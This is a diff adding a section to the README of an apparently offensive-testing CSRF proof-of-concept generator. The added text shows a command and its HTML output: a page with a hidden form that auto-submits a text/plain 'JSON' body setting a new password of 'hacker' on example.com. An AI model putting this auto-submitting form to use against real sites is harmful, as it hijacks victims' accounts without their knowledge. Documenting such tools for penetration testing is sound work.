@@ -30,7 +30,27 @@ optional arguments:
                         enctype
 ```
 
+# JSON Based CSRF PoC 
 
+Note: Some applications accept Json data when Content-type: ```text/plain```
+
+```
+root@ghost:~# python3 csrf_poc_gen.py -u http://example.com -m post -p '{new_password: "hacker", re_password: "hacker", extra": =extra}' -e "text/plain"
+<html>
+  <title>
+    This CSRF was found by 
+  </title>
+  <body>
+    <h1>
+      This POC was Created By CSRF PoC Generator Tool
+    </h1>
+    <form action="http://example.com" method="POST" enctype="text/plain">
+      <input type="hidden" name="{new_password: %22hacker%22, re_password: %22hacker%22, extra%22: " value="extra}" />
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
+</html>
+```
 
 # To Generate PoC 
 
